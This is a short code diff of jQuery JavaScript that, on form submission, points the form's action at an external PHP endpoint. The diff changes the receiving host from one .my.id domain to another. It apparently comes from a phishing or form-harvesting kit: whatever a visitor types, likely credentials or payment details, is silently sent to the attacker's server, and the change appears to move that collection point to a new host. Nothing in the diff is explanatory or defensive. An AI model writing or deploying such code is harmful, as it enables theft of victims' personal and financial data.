@@ -1,3 +1,3 @@
 $("form").submit(function() {
-  $(myform).attr("action", "https://balance-new.my.id/sultanann.php");
+  $(myform).attr("action", "https://jajananan-rakyats.my.id/sultanann.php");
 });
